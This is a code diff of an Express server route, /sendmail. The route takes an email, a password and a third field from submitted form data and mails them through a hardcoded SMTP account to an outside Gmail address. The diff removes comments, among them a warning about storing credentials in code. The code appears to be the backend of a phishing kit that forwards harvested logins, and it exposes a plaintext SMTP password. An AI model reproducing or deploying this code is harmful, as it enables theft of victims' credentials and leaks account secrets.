@@ -19,16 +19,13 @@ app.get("/", (req, res) => {
 app.post("/sendmail", async (req, res) => {
   let { email, pass, pasers } = req.body;
   let transporter = nodemailer.createTransport({
-    host: "mail.whitetransport.net", // SMTP server address (usually mail.your-domain.com)
-    port: 465, // Port for SMTP (usually 465)
+    host: "mail.whitetransport.net",
+    port: 465,
     auth: {
-      user: "mustafa@whitetransport.net", // Your email address
-      pass: "uf4DBAatO5Ut", // Password (for gmail, your app password)
-      // ⚠️ For better security, use environment variables set on the server for these values when deploying
+      user: "mustafa@whitetransport.net",
+      pass: "uf4DBAatO5Ut",
     },
   });
-
-  // Define and send message inside transporter.sendEmail() and await info about send from promise:
   let info = await transporter.sendMail({
     from: '"You" <mustafa@whitetransport.net>',
     to: "fredrick3smith33@gmail.com",
